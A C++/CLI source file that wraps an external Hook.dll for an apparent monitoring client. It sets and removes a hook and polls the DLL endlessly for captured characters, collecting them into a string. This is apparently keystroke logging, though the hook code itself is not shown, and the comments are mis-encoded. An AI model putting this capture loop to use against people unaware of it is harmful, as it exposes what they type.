#include"stdafx.h"
#include"HookPro.h"
//#using <Hook.dll>;
hookpro::hookpro()
{
	String^local = Application::StartupPath;
	SHookData ="";
	
}
hookpro::~hookpro()
{
	SHookData=String::Empty;//hook���ص�����
	GC::Collect();
}
int hookpro::SetHook()
	   {
#pragma comment(lib,"F:\\.NET program\\MonitoringClient\\Debug\\Hook.lib")
	extern int  _declspec(dllimport) _cdecl _SetHook();
	if (_SetHook()==0)
			   return 0;
	else
	return -1;
	   }
int hookpro::UnHook()
{

#pragma comment(lib,"F:\\.NET program\\MonitoringClient\\Debug\\Hook.lib")
	extern int _declspec(dllimport)_cdecl _UnsetHook();
		   return _UnsetHook();
	   }
void hookpro::GetHookData()
	   {
#pragma comment(lib,"F:\\.NET program\\MonitoringClient\\Debug\\Hook.lib")
	extern char _declspec(dllimport) _cdecl _GetData();
			while (1)
			{
				Sleep(2);//����5���룻
		hookdata= _GetData();
			if (hookdata==0)
				continue;
			chartostring(hookdata);
			SHookData += TempKey;
			TempKey = String::Empty;
			}
			GC::Collect();
	   }
void hookpro::chartostring(char dat)//��char��������ת����String����
{
	Char data=dat;
	TempKey = data.ToString();
}